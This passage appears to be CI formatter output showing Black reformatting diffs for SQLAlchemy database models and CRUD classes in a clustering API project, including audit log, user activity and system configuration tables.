     sample_size = Column(Integer)  # Number of samples for aggregated metrics
-    
+
     # Statistical properties
     min_value = Column(DECIMAL(20, 6))
     max_value = Column(DECIMAL(20, 6))
     avg_value = Column(DECIMAL(20, 6))
     std_dev = Column(DECIMAL(20, 6))
     percentile_95 = Column(DECIMAL(20, 6))
     percentile_99 = Column(DECIMAL(20, 6))
-    
+
     # Metadata
     tags = Column(JSONB)  # Additional categorization tags
     notes = Column(Text)
-    
+
     # Relationships
     session = relationship("ProcessingSession", back_populates="performance_metrics")
-    
+
     __table_args__ = (
-        Index('idx_metrics_session_name', 'session_id', 'metric_name'),
-        Index('idx_metrics_category', 'metric_category'),
-        Index('idx_metrics_timestamp', 'measurement_timestamp'),
-        Index('idx_metrics_session_time', 'session_id', 'measurement_timestamp'),
-        CheckConstraint('sample_size > 0', name='ck_positive_sample_size'),
-        CheckConstraint('measurement_window_seconds > 0', name='ck_positive_window')
-    )
+        Index("idx_metrics_session_name", "session_id", "metric_name"),
+        Index("idx_metrics_category", "metric_category"),
+        Index("idx_metrics_timestamp", "measurement_timestamp"),
+        Index("idx_metrics_session_time", "session_id", "measurement_timestamp"),
+        CheckConstraint("sample_size > 0", name="ck_positive_sample_size"),
+        CheckConstraint("measurement_window_seconds > 0", name="ck_positive_window"),
+    )
+
 
 class AuditLog(Base, TimestampMixin):
     """
     Comprehensive audit trail for security and compliance.
-    
+
     Records all significant actions, API calls, and system events
     for security monitoring, compliance, and troubleshooting.
     """
-    __tablename__ = 'audit_logs'
-    
+
+    __tablename__ = "audit_logs"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    
+
     # Event identification
     event_type = Column(String(100), nullable=False)  # api_call, config_change, etc.
     event_category = Column(String(50), nullable=False)  # security, data, system, etc.
     action = Column(String(100), nullable=False)  # create, update, delete, access, etc.
     resource_type = Column(String(100))  # session, cluster, configuration, etc.
     resource_id = Column(String(255))  # ID of affected resource
-    
+
     # Actor information
     user_id = Column(String(255))
     user_email = Column(String(320))
     user_role = Column(String(100))
     api_key_id = Column(String(255))
     client_ip = Column(String(45))  # IPv6-compatible
     user_agent = Column(String(1000))
-    
+
     # Request context
     request_id = Column(String(255))
     session_id = Column(String(255))
     endpoint = Column(String(500))
     http_method = Column(String(10))
     request_size_bytes = Column(BigInteger)
     response_size_bytes = Column(BigInteger)
     response_status = Column(SmallInteger)
     processing_time_ms = Column(Float)
-    
+
     # Event details
     description = Column(Text, nullable=False)
     old_values = Column(JSONB)  # Previous values for changes
     new_values = Column(JSONB)  # New values for changes
     metadata = Column(JSONB)  # Additional context data
-    
+
     # Security context
-    security_level = Column(String(20), default='info', nullable=False)  # info, warning, critical
+    security_level = Column(
+        String(20), default="info", nullable=False
+    )  # info, warning, critical
     risk_score = Column(SmallInteger)  # 0-100 risk assessment
     threat_indicators = Column(ARRAY(String))
-    
+
     # Compliance and retention
-    retention_policy = Column(String(50), default='standard')
+    retention_policy = Column(String(50), default="standard")
     compliance_tags = Column(ARRAY(String))
-    
+
     __table_args__ = (
-        Index('idx_audit_user', 'user_id'),
-        Index('idx_audit_event_type', 'event_type'),
-        Index('idx_audit_timestamp', 'created_at'),
-        Index('idx_audit_resource', 'resource_type', 'resource_id'),
-        Index('idx_audit_security', 'security_level'),
-        Index('idx_audit_ip', 'client_ip'),
-        CheckConstraint('security_level IN (\'info\', \'warning\', \'critical\')', 
-                       name='ck_valid_security_level'),
-        CheckConstraint('risk_score >= 0 AND risk_score <= 100', name='ck_valid_risk_score')
-    )
+        Index("idx_audit_user", "user_id"),
+        Index("idx_audit_event_type", "event_type"),
+        Index("idx_audit_timestamp", "created_at"),
+        Index("idx_audit_resource", "resource_type", "resource_id"),
+        Index("idx_audit_security", "security_level"),
+        Index("idx_audit_ip", "client_ip"),
+        CheckConstraint(
+            "security_level IN ('info', 'warning', 'critical')",
+            name="ck_valid_security_level",
+        ),
+        CheckConstraint(
+            "risk_score >= 0 AND risk_score <= 100", name="ck_valid_risk_score"
+        ),
+    )
+
 
 class UserActivity(Base, TimestampMixin):
     """
     User activity tracking for analytics and usage monitoring.
-    
+
     Records user interactions, preferences, and usage patterns
     for improving user experience and system optimization.
     """
-    __tablename__ = 'user_activities'
-    
+
+    __tablename__ = "user_activities"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     user_id = Column(String(255), nullable=False)
-    
+
     # Activity details
-    activity_type = Column(String(100), nullable=False)  # login, api_call, config_change
+    activity_type = Column(
+        String(100), nullable=False
+    )  # login, api_call, config_change
     activity_name = Column(String(200))  # Specific activity description
-    category = Column(String(50), nullable=False)  # authentication, processing, configuration
-    
+    category = Column(
+        String(50), nullable=False
+    )  # authentication, processing, configuration
+
     # Context and metadata
     session_token = Column(String(255))
     client_info = Column(JSONB)  # Browser, OS, device info
     location_info = Column(JSONB)  # Geographic location if available
-    
+
     # Performance and usage metrics
     duration_seconds = Column(Float)
     data_processed_mb = Column(Float)
     api_calls_count = Column(Integer, default=0)
     success_rate = Column(Float)  # Success percentage for batch operations
-    
+
     # Resource utilization
     cpu_time_ms = Column(Float)
     memory_peak_mb = Column(Float)
     network_io_mb = Column(Float)
-    
+
     # User preferences and behavior
     preferred_settings = Column(JSONB)
     feature_usage = Column(JSONB)  # Which features were used
     interaction_path = Column(ARRAY(String))  # Sequence of actions
-    
+
     # Outcome and feedback
-    completion_status = Column(String(20), default='completed')
+    completion_status = Column(String(20), default="completed")
     error_message = Column(Text)
     user_satisfaction_score = Column(SmallInteger)  # 1-5 rating if provided
     feedback_text = Column(Text)
-    
+
     __table_args__ = (
-        Index('idx_user_activity_user', 'user_id'),
-        Index('idx_user_activity_type', 'activity_type'),
-        Index('idx_user_activity_timestamp', 'created_at'),
-        Index('idx_user_activity_category', 'category'),
-        CheckConstraint('completion_status IN (\'completed\', \'failed\', \'cancelled\', \'timeout\')', 
-                       name='ck_valid_completion_status'),
-        CheckConstraint('user_satisfaction_score >= 1 AND user_satisfaction_score <= 5', 
-                       name='ck_valid_satisfaction_score')
-    )
+        Index("idx_user_activity_user", "user_id"),
+        Index("idx_user_activity_type", "activity_type"),
+        Index("idx_user_activity_timestamp", "created_at"),
+        Index("idx_user_activity_category", "category"),
+        CheckConstraint(
+            "completion_status IN ('completed', 'failed', 'cancelled', 'timeout')",
+            name="ck_valid_completion_status",
+        ),
+        CheckConstraint(
+            "user_satisfaction_score >= 1 AND user_satisfaction_score <= 5",
+            name="ck_valid_satisfaction_score",
+        ),
+    )
+
 
 class SystemConfiguration(Base, TimestampMixin):
     """
     System configuration management and versioning.
-    
+
     Stores system settings, algorithm parameters, and configuration
     history for change tracking and rollback capabilities.
     """
-    __tablename__ = 'system_configurations'
-    
+
+    __tablename__ = "system_configurations"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     config_key = Column(String(200), nullable=False)
-    config_category = Column(String(100), nullable=False)  # algorithm, security, performance
-    
+    config_category = Column(
+        String(100), nullable=False
+    )  # algorithm, security, performance
+
     # Configuration values
     config_value = Column(JSONB, nullable=False)
     default_value = Column(JSONB)
-    data_type = Column(String(50), nullable=False)  # string, integer, float, boolean, json
-    
+    data_type = Column(
+        String(50), nullable=False
+    )  # string, integer, float, boolean, json
+
     # Validation and constraints
     validation_schema = Column(JSONB)  # JSON schema for validation
     min_value = Column(Float)
     max_value = Column(Float)
     allowed_values = Column(ARRAY(String))
-    
+
     # Metadata and documentation
     description = Column(Text)
     documentation_url = Column(String(1000))
     example_value = Column(JSONB)
-    
+
     # Change management
     version = Column(Integer, default=1, nullable=False)
     changed_by = Column(String(255))
     change_reason = Column(Text)
     previous_value = Column(JSONB)
-    
+
     # Status and lifecycle
     is_active = Column(Boolean, default=True, nullable=False)
-    is_sensitive = Column(Boolean, default=False, nullable=False)  # Contains sensitive data
+    is_sensitive = Column(
+        Boolean, default=False, nullable=False
+    )  # Contains sensitive data
     requires_restart = Column(Boolean, default=False, nullable=False)
-    environment = Column(String(50), default='production')  # dev, staging, production
-    
+    environment = Column(String(50), default="production")  # dev, staging, production
+
     # Impact and dependencies
     affects_components = Column(ARRAY(String))  # Which components use this config
     dependencies = Column(ARRAY(String))  # Other configs this depends on
-    
+
     __table_args__ = (
-        Index('idx_config_key', 'config_key'),
-        Index('idx_config_category', 'config_category'),
-        Index('idx_config_active', 'is_active'),
-        Index('idx_config_environment', 'environment'),
-        UniqueConstraint('config_key', 'environment', name='uq_config_key_env'),
-        CheckConstraint('version > 0', name='ck_positive_version'),
-        CheckConstraint('environment IN (\'development\', \'staging\', \'production\')', 
-                       name='ck_valid_environment')
-    )
-    
-    @validates('config_value')
+        Index("idx_config_key", "config_key"),
+        Index("idx_config_category", "config_category"),
+        Index("idx_config_active", "is_active"),
+        Index("idx_config_environment", "environment"),
+        UniqueConstraint("config_key", "environment", name="uq_config_key_env"),
+        CheckConstraint("version > 0", name="ck_positive_version"),
+        CheckConstraint(
+            "environment IN ('development', 'staging', 'production')",
+            name="ck_valid_environment",
+        ),
+    )
+
+    @validates("config_value")
     def validate_config_value(self, key, value):
         """Validate configuration value against constraints."""
-        if self.data_type == 'integer' and not isinstance(value, int):
+        if self.data_type == "integer" and not isinstance(value, int):
             raise ValueError("Value must be an integer")
-        elif self.data_type == 'float' and not isinstance(value, (int, float)):
+        elif self.data_type == "float" and not isinstance(value, (int, float)):
             raise ValueError("Value must be a number")
-        elif self.data_type == 'boolean' and not isinstance(value, bool):
+        elif self.data_type == "boolean" and not isinstance(value, bool):
             raise ValueError("Value must be a boolean")
-        elif self.data_type == 'string' and not isinstance(value, str):
+        elif self.data_type == "string" and not isinstance(value, str):
             raise ValueError("Value must be a string")
-        return value
\ No newline at end of file
+        return value
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/database/crud.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/database/crud.py	2025-06-10 20:31:25.477857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/database/crud.py	2025-06-10 20:32:33.933022+00:00
@@ -15,23 +15,29 @@
 from sqlalchemy.orm import Session, joinedload, selectinload
 from sqlalchemy.exc import SQLAlchemyError, IntegrityError
 from sqlalchemy.dialects.postgresql import insert
 
 from .models import (
-    DataPointRecord, ClusterRecord, ProcessingSession, PerformanceMetric,
-    AuditLog, UserActivity, SystemConfiguration
+    DataPointRecord,
+    ClusterRecord,
+    ProcessingSession,
+    PerformanceMetric,
+    AuditLog,
+    UserActivity,
+    SystemConfiguration,
 )
 from app.exceptions import DatabaseException, ValidationException
 
 logger = logging.getLogger(__name__)
 
+
 class BaseCRUD:
     """Base CRUD operations for all models."""
-    
+
     def __init__(self, model):
         self.model = model
-        
+
     def create(self, db: Session, *, obj_in: Dict[str, Any]) -> Any:
         """Create a new record."""
         try:
             db_obj = self.model(**obj_in)
             db.add(db_obj)
@@ -41,60 +47,62 @@
         except IntegrityError as e:
             db.rollback()
             raise ValidationException(f"Integrity constraint violation: {e}")
         except SQLAlchemyError as e:
             db.rollback()
-            raise DatabaseException(f"Database error creating {self.model.__name__}: {e}")
-            
+            raise DatabaseException(
+                f"Database error creating {self.model.__name__}: {e}"
+            )
+
     def get(self, db: Session, id: Union[str, uuid.UUID]) -> Optional[Any]:
         """Get record by ID."""
         try:
             return db.query(self.model).filter(self.model.id == id).first()
         except SQLAlchemyError as e:
-            raise DatabaseException(f"Database error retrieving {self.model.__name__}: {e}")
-            
+            raise DatabaseException(
+                f"Database error retrieving {self.model.__name__}: {e}"
+            )
+
     def get_multi(
-        self, 
-        db: Session, 
-        *, 
-        skip: int = 0, 
+        self,
+        db: Session,
+        *,
+        skip: int = 0,
         limit: int = 100,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Any]:
         """Get multiple records with optional filtering."""
         try:
             query = db.query(self.model)
-            
+
             if filters:
                 for key, value in filters.items():
                     if hasattr(self.model, key):
                         query = query.filter(getattr(self.model, key) == value)
-                        
+
             return query.offset(skip).limit(limit).all()
         except SQLAlchemyError as e:
-            raise DatabaseException(f"Database error retrieving {self.model.__name__} records: {e}")
-            
-    def update(
-        self, 
-        db: Session, 
-        *, 
-        db_obj: Any, 
-        obj_in: Dict[str, Any]
-    ) -> Any:
+            raise DatabaseException(
+                f"Database error retrieving {self.model.__name__} records: {e}"
+            )
+
+    def update(self, db: Session, *, db_obj: Any, obj_in: Dict[str, Any]) -> Any:
         """Update an existing record."""
         try:
             for field, value in obj_in.items():
                 if hasattr(db_obj, field):
                     setattr(db_obj, field, value)
-                    
+
             db.flush()
             db.refresh(db_obj)
             return db_obj
         except SQLAlchemyError as e:
             db.rollback()
-            raise DatabaseException(f"Database error updating {self.model.__name__}: {e}")
-            
+            raise DatabaseException(
+                f"Database error updating {self.model.__name__}: {e}"
+            )
+
     def delete(self, db: Session, *, id: Union[str, uuid.UUID]) -> bool:
         """Delete a record by ID."""
         try:
             obj = db.query(self.model).filter(self.model.id == id).first()
             if obj:
@@ -102,503 +110,586 @@
                 db.flush()
                 return True
             return False
         except SQLAlchemyError as e:
             db.rollback()
-            raise DatabaseException(f"Database error deleting {self.model.__name__}: {e}")
+            raise DatabaseException(
+                f"Database error deleting {self.model.__name__}: {e}"
+            )
+
 
 class DataPointCRUD(BaseCRUD):
     """CRUD operations for DataPointRecord."""
-    
+
     def __init__(self):
         super().__init__(DataPointRecord)
-        
-    def create_batch(self, db: Session, *, data_points: List[Dict[str, Any]]) -> List[DataPointRecord]:
+
+    def create_batch(
+        self, db: Session, *, data_points: List[Dict[str, Any]]
+    ) -> List[DataPointRecord]:
         """Create multiple data points in a single transaction."""
         try:
             db_objects = []
             for point_data in data_points:
                 db_obj = DataPointRecord(**point_data)
                 db_objects.append(db_obj)
-                
+
             db.add_all(db_objects)
             db.flush()
-            
+
             for obj in db_objects:
                 db.refresh(obj)
-                
+
             return db_objects
         except SQLAlchemyError as e:
             db.rollback()
             raise DatabaseException(f"Database error creating batch data points: {e}")
-            
+
     def get_by_session(
-        self, 
-        db: Session, 
+        self,
+        db: Session,
         session_id: uuid.UUID,
         *,
         skip: int = 0,
         limit: int = 1000,
-        include_outliers: bool = True
+        include_outliers: bool = True,
     ) -> List[DataPointRecord]:
         """Get data points for a specific session."""
         try:
             query = db.query(DataPointRecord).filter(
                 DataPointRecord.session_id == session_id
             )
-            
+
             if not include_outliers:
                 query = query.filter(DataPointRecord.is_outlier == False)
-                
-            return query.order_by(DataPointRecord.processing_order)\
-                       .offset(skip).limit(limit).all()
-        except SQLAlchemyError as e:
-            raise DatabaseException(f"Database error retrieving session data points: {e}")
-            
+
+            return (
+                query.order_by(DataPointRecord.processing_order)
+                .offset(skip)
+                .limit(limit)
+                .all()
+            )
+        except SQLAlchemyError as e:
+            raise DatabaseException(
+                f"Database error retrieving session data points: {e}"
+            )
+
     def get_by_cluster(
-        self, 
-        db: Session, 
-        cluster_id: uuid.UUID,
-        *,
-        skip: int = 0,
-        limit: int = 1000
+        self, db: Session, cluster_id: uuid.UUID, *, skip: int = 0, limit: int = 1000
     ) -> List[DataPointRecord]:
         """Get all data points assigned to a specific cluster."""
         try:
-            return db.query(DataPointRecord)\
-                    .filter(DataPointRecord.cluster_id == cluster_id)\
-                    .order_by(DataPointRecord.processing_order)\
-                    .offset(skip).limit(limit).all()
-        except SQLAlchemyError as e:
-            raise DatabaseException(f"Database error retrieving cluster data points: {e}")
-            
+            return (
+                db.query(DataPointRecord)
+                .filter(DataPointRecord.cluster_id == cluster_id)
+                .order_by(DataPointRecord.processing_order)
+                .offset(skip)
+                .limit(limit)
+                .all()
+            )
+        except SQLAlchemyError as e:
+            raise DatabaseException(
+                f"Database error retrieving cluster data points: {e}"
+            )
+
     def get_outliers(
         self,
         db: Session,
         session_id: Optional[uuid.UUID] = None,
         *,
         min_score: float = 0.5,
         skip: int = 0,
-        limit: int = 1000
+        limit: int = 1000,
     ) -> List[DataPointRecord]:
         """Get outlier data points with optional filtering."""
         try:
             query = db.query(DataPointRecord).filter(
                 and_(
                     DataPointRecord.is_outlier == True,
-                    DataPointRecord.outlier_score >= min_score
-                )
-            )
-            
+                    DataPointRecord.outlier_score >= min_score,
+                )
+            )
+
             if session_id:
                 query = query.filter(DataPointRecord.session_id == session_id)
-                
-            return query.order_by(desc(DataPointRecord.outlier_score))\
-                       .offset(skip).limit(limit).all()
+
+            return (
+                query.order_by(desc(DataPointRecord.outlier_score))
+                .offset(skip)
+                .limit(limit)
+                .all()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving outliers: {e}")
-            
+
     def get_statistics(self, db: Session, session_id: uuid.UUID) -> Dict[str, Any]:
         """Get statistical summary for data points in a session."""
         try:
-            stats = db.query(
-                func.count(DataPointRecord.id).label('total_points'),
-                func.count().filter(DataPointRecord.is_outlier == True).label('outlier_count'),
-                func.count().filter(DataPointRecord.cluster_id.isnot(None)).label('clustered_count'),
-                func.avg(DataPointRecord.confidence_score).label('avg_confidence'),
-                func.avg(DataPointRecord.processing_time_ms).label('avg_processing_time'),
-                func.max(DataPointRecord.processing_time_ms).label('max_processing_time'),
-                func.min(DataPointRecord.processing_time_ms).label('min_processing_time')
-            ).filter(DataPointRecord.session_id == session_id).first()
-            
+            stats = (
+                db.query(
+                    func.count(DataPointRecord.id).label("total_points"),
+                    func.count()
+                    .filter(DataPointRecord.is_outlier == True)
+                    .label("outlier_count"),
+                    func.count()
+                    .filter(DataPointRecord.cluster_id.isnot(None))
+                    .label("clustered_count"),
+                    func.avg(DataPointRecord.confidence_score).label("avg_confidence"),
+                    func.avg(DataPointRecord.processing_time_ms).label(
+                        "avg_processing_time"
+                    ),
+                    func.max(DataPointRecord.processing_time_ms).label(
+                        "max_processing_time"
+                    ),
+                    func.min(DataPointRecord.processing_time_ms).label(
+                        "min_processing_time"
+                    ),
+                )
+                .filter(DataPointRecord.session_id == session_id)
+                .first()
+            )
+
             return {
-                'total_points': stats.total_points or 0,
-                'outlier_count': stats.outlier_count or 0,
-                'clustered_count': stats.clustered_count or 0,
-                'outlier_percentage': (stats.outlier_count / stats.total_points * 100) if stats.total_points else 0,
-                'clustering_percentage': (stats.clustered_count / stats.total_points * 100) if stats.total_points else 0,
-                'avg_confidence': float(stats.avg_confidence) if stats.avg_confidence else 0,
-                'avg_processing_time_ms': float(stats.avg_processing_time) if stats.avg_processing_time else 0,
-                'max_processing_time_ms': float(stats.max_processing_time) if stats.max_processing_time else 0,
-                'min_processing_time_ms': float(stats.min_processing_time) if stats.min_processing_time else 0
+                "total_points": stats.total_points or 0,
+                "outlier_count": stats.outlier_count or 0,
+                "clustered_count": stats.clustered_count or 0,
+                "outlier_percentage": (stats.outlier_count / stats.total_points * 100)
+                if stats.total_points
+                else 0,
+                "clustering_percentage": (
+                    stats.clustered_count / stats.total_points * 100
+                )
+                if stats.total_points
+                else 0,
+                "avg_confidence": float(stats.avg_confidence)
+                if stats.avg_confidence
+                else 0,
+                "avg_processing_time_ms": float(stats.avg_processing_time)
+                if stats.avg_processing_time
+                else 0,
+                "max_processing_time_ms": float(stats.max_processing_time)
+                if stats.max_processing_time
+                else 0,
+                "min_processing_time_ms": float(stats.min_processing_time)
+                if stats.min_processing_time
+                else 0,
             }
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error calculating statistics: {e}")
+
 
 class ClusterCRUD(BaseCRUD):
     """CRUD operations for ClusterRecord."""
-    
+
     def __init__(self):
         super().__init__(ClusterRecord)
-        
+
     def get_active_clusters(
-        self, 
-        db: Session, 
-        session_id: uuid.UUID,
-        *,
-        health_status: Optional[str] = None
+        self, db: Session, session_id: uuid.UUID, *, health_status: Optional[str] = None
     ) -> List[ClusterRecord]:
         """Get active clusters for a session."""
         try:
             query = db.query(ClusterRecord).filter(
                 and_(
                     ClusterRecord.session_id == session_id,
-                    ClusterRecord.is_active == True
-                )
-            )
-            
+                    ClusterRecord.is_active == True,
+                )
+            )
+
             if health_status:
                 query = query.filter(ClusterRecord.health_status == health_status)
-                
+
             return query.order_by(desc(ClusterRecord.point_count)).all()
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving active clusters: {e}")
-            
+
     def get_cluster_evolution(
-        self, 
-        db: Session, 
-        cluster_id: uuid.UUID
+        self, db: Session, cluster_id: uuid.UUID
     ) -> List[ClusterRecord]:
         """Get cluster evolution history (parent-child relationships)."""
         try:
             # Get the cluster and its ancestry
-            cluster = db.query(ClusterRecord).filter(ClusterRecord.id == cluster_id).first()
+            cluster = (
+                db.query(ClusterRecord).filter(ClusterRecord.id == cluster_id).first()
+            )
             if not cluster:
                 return []
-                
+
             # Build the family tree
             family_tree = []
-            
+
             # Get ancestors
             current = cluster
             while current.parent_cluster_id:
-                parent = db.query(ClusterRecord).filter(
-                    ClusterRecord.id == current.parent_cluster_id
-                ).first()
+                parent = (
+                    db.query(ClusterRecord)
+                    .filter(ClusterRecord.id == current.parent_cluster_id)
+                    .first()
+                )
                 if parent:
                     family_tree.insert(0, parent)
                     current = parent
                 else:
                     break
-                    
+
             # Add the cluster itself
             family_tree.append(cluster)
-            
+
             # Get descendants (simplified - direct children only)
-            children = db.query(ClusterRecord).filter(
-                ClusterRecord.parent_cluster_id == cluster_id
-            ).all()
+            children = (
+                db.query(ClusterRecord)
+                .filter(ClusterRecord.parent_cluster_id == cluster_id)
+                .all()
+            )
             family_tree.extend(children)
-            
+
             return family_tree
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving cluster evolution: {e}")
-            
+
     def get_merge_candidates(
-        self, 
-        db: Session, 
-        session_id: uuid.UUID,
-        *,
-        max_distance: float = 0.5
+        self, db: Session, session_id: uuid.UUID, *, max_distance: float = 0.5
     ) -> List[Tuple[ClusterRecord, ClusterRecord]]:
         """Find clusters that are candidates for merging."""
         try:
             # This is a simplified implementation
             # In practice, you'd use more sophisticated distance calculations
-            candidates = db.query(ClusterRecord).filter(
-                and_(
-                    ClusterRecord.session_id == session_id,
-                    ClusterRecord.is_active == True,
-                    ClusterRecord.merge_candidate == True
-                )
-            ).all()
-            
+            candidates = (
+                db.query(ClusterRecord)
+                .filter(
+                    and_(
+                        ClusterRecord.session_id == session_id,
+                        ClusterRecord.is_active == True,
+                        ClusterRecord.merge_candidate == True,
+                    )
+                )
+                .all()
+            )
+
             merge_pairs = []
             for i, cluster1 in enumerate(candidates):
-                for cluster2 in candidates[i+1:]:
+                for cluster2 in candidates[i + 1 :]:
                     # Simple centroid distance check
                     # In practice, use proper distance calculation
                     if cluster1.separation and cluster2.separation:
                         avg_separation = (cluster1.separation + cluster2.separation) / 2
                         if avg_separation < max_distance:
                             merge_pairs.append((cluster1, cluster2))
-                            
+
             return merge_pairs
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error finding merge candidates: {e}")
-            
-    def update_cluster_stats(
-        self, 
-        db: Session, 
-        cluster_id: uuid.UUID
-    ) -> ClusterRecord:
+
+    def update_cluster_stats(self, db: Session, cluster_id: uuid.UUID) -> ClusterRecord:
         """Update cluster statistics based on its data points."""
         try:
-            cluster = db.query(ClusterRecord).filter(ClusterRecord.id == cluster_id).first()
+            cluster = (
+                db.query(ClusterRecord).filter(ClusterRecord.id == cluster_id).first()
+            )
             if not cluster:
                 raise ValidationException(f"Cluster {cluster_id} not found")
-                
+
             # Calculate updated statistics
-            stats = db.query(
-                func.count(DataPointRecord.id).label('point_count'),
-                func.avg(DataPointRecord.confidence_score).label('avg_confidence'),
-                func.avg(DataPointRecord.silhouette_score).label('avg_silhouette'),
-                func.avg(DataPointRecord.stability_score).label('avg_stability')
-            ).filter(DataPointRecord.cluster_id == cluster_id).first()
-            
+            stats = (
+                db.query(
+                    func.count(DataPointRecord.id).label("point_count"),
+                    func.avg(DataPointRecord.confidence_score).label("avg_confidence"),
+                    func.avg(DataPointRecord.silhouette_score).label("avg_silhouette"),
+                    func.avg(DataPointRecord.stability_score).label("avg_stability"),
+                )
+                .filter(DataPointRecord.cluster_id == cluster_id)
+                .first()
+            )
+
             # Update cluster properties
             cluster.point_count = stats.point_count or 0
-            cluster.silhouette_avg = float(stats.avg_silhouette) if stats.avg_silhouette else None
-            cluster.stability_score = float(stats.avg_stability) if stats.avg_stability else None
+            cluster.silhouette_avg = (
+                float(stats.avg_silhouette) if stats.avg_silhouette else None
+            )
+            cluster.stability_score = (
+                float(stats.avg_stability) if stats.avg_stability else None
+            )
             cluster.last_updated = datetime.utcnow()
-            
+
             # Update health status based on statistics
             if cluster.point_count < cluster.min_points:
-                cluster.health_status = 'critical'
+                cluster.health_status = "critical"
             elif cluster.silhouette_avg and cluster.silhouette_avg < 0.3:
-                cluster.health_status = 'warning'
+                cluster.health_status = "warning"
             else:
-                cluster.health_status = 'healthy'
-                
+                cluster.health_status = "healthy"
+
             db.flush()
             db.refresh(cluster)
             return cluster
         except SQLAlchemyError as e:
             db.rollback()
             raise DatabaseException(f"Database error updating cluster stats: {e}")
 
+
 class SessionCRUD(BaseCRUD):
     """CRUD operations for ProcessingSession."""
-    
+
     def __init__(self):
         super().__init__(ProcessingSession)
-        
+
     def get_by_user(
-        self, 
-        db: Session, 
+        self,
+        db: Session,
         user_id: str,
         *,
         status: Optional[str] = None,
         skip: int = 0,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[ProcessingSession]:
         """Get sessions for a specific user."""
         try:
-            query = db.query(ProcessingSession).filter(ProcessingSession.user_id == user_id)
-            
+            query = db.query(ProcessingSession).filter(
+                ProcessingSession.user_id == user_id
+            )
+
             if status:
                 query = query.filter(ProcessingSession.status == status)
-                
-            return query.order_by(desc(ProcessingSession.start_time))\
-                       .offset(skip).limit(limit).all()
+
+            return (
+                query.order_by(desc(ProcessingSession.start_time))
+                .offset(skip)
+                .limit(limit)
+                .all()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving user sessions: {e}")
-            
+
     def get_active_sessions(self, db: Session) -> List[ProcessingSession]:
         """Get all currently active sessions."""
         try:
-            return db.query(ProcessingSession)\
-                    .filter(ProcessingSession.status == 'active')\
-                    .order_by(ProcessingSession.start_time).all()
+            return (
+                db.query(ProcessingSession)
+                .filter(ProcessingSession.status == "active")
+                .order_by(ProcessingSession.start_time)
+                .all()
+            )
         except SQLAlchemyError as e:
             raise DatabaseException(f"Database error retrieving active sessions: {e}")
-            
+
     def complete_session(
-        self, 
-        db: Session, 
+        self,
+        db: Session,
         session_id: uuid.UUID,
         *,
-        status: str = 'completed',
-        final_stats: Optional[Dict[str, Any]] = None
+        status: str = "completed",
+        final_stats: Optional[Dict[str, Any]] = None,
     ) -> ProcessingSession:
         """Mark a session as completed and update final statistics."""
         try:
-            session = db.query(ProcessingSession).filter(
-                ProcessingSession.id == session_id
-            ).first()
-            
+            session = (
+                db.query(ProcessingSession)
+                .filter(ProcessingSession.id == session_id)
+                .first()
+            )
+
             if not session:
                 raise ValidationException(f"Session {session_id} not found")
-                
+
             session.status = status
             session.end_time = datetime.utcnow()
-            
+
             if session.start_time:
                 session.total_duration_seconds = (
                     session.end_time - session.start_time
                 ).total_seconds()
-                
+
             if final_stats:
                 for key, value in final_stats.items():
                     if hasattr(session, key):
                         setattr(session, key, value)
-                        
+
             db.flush()
             db.refresh(session)
             return session
         except SQLAlchemyError as e:
             db.rollback()
             raise DatabaseException(f"Database error completing session: {e}")
-            
+
     def get_session_summary(self, db: Session, session_id: uuid.UUID) -> Dict[str, Any]:
         """Get comprehensive session summary with related data."""
         try:
-            session = db.query(ProcessingSession)\
-                       .options(
-                           selectinload(ProcessingSession.data_points),
-                           selectinload(ProcessingSession.clusters),
-                           selectinload(ProcessingSession.performance_metrics)
-                       )\
-                       .filter(ProcessingSession.id == session_id).first()
-                       
+            session = (
+                db.query(ProcessingSession)
+                .options(
+                    selectinload(ProcessingSession.data_points),
+                    selectinload(ProcessingSession.clusters),
+                    selectinload(ProcessingSession.performance_metrics),
+                )
+                .filter(ProcessingSession.id == session_id)
+                .first()
+            )
+
             if not session:
                 raise ValidationException(f"Session {session_id} not found")
-                
+
             # Build comprehensive summary
             summary = {
-                'session': {
-                    'id': str(session.id),
-                    'name': session.session_name,
-                    'status': session.status,
-                    'start_time': session.start_time.isoformat() if session.start_time else None,
-                    'end_time': session.end_time.isoformat() if session.end_time else None,
-                    'duration_seconds': session.total_duration_seconds,
-                    'user_id': session.user_id
+                "session": {
+                    "id": str(session.id),
+                    "name": session.session_name,
+                    "status": session.status,
+                    "start_time": session.start_time.isoformat()
+                    if session.start_time
+                    else None,
+                    "end_time": session.end_time.isoformat()
+                    if session.end_time
+                    else None,
+                    "duration_seconds": session.total_duration_seconds,
+                    "user_id": session.user_id,
                 },
-                'data_summary': {
-                    'total_points': session.total_points_processed,
-                    'clustered_points': session.total_points_clustered,
-                    'outliers': session.total_outliers_detected,
-                    'clusters_created': session.unique_clusters_created,
-                    'noise_ratio': session.noise_ratio
+                "data_summary": {
+                    "total_points": session.total_points_processed,
+                    "clustered_points": session.total_points_clustered,
+                    "outliers": session.total_outliers_detected,
+                    "clusters_created": session.unique_clusters_created,
+                    "noise_ratio": session.noise_ratio,
                 },
-                'performance': {
-                    'avg_processing_time_ms': session.avg_processing_time_ms,
-                    'throughput_points_per_sec': session.throughput_points_per_sec,
-                    'peak_memory_mb': session.peak_memory_usage_mb,
-                    'avg_cpu_percent': session.avg_cpu_usage_percent
+                "performance": {
+                    "avg_processing_time_ms": session.avg_processing_time_ms,
+                    "throughput_points_per_sec": session.throughput_points_per_sec,
+                    "peak_memory_mb": session.peak_memory_usage_mb,
+                    "avg_cpu_percent": session.avg_cpu_usage_percent,
                 },
-                'quality': {
-                    'silhouette_score': session.overall_silhouette_score,
-                    'cluster_purity': session.cluster_purity
+                "quality": {
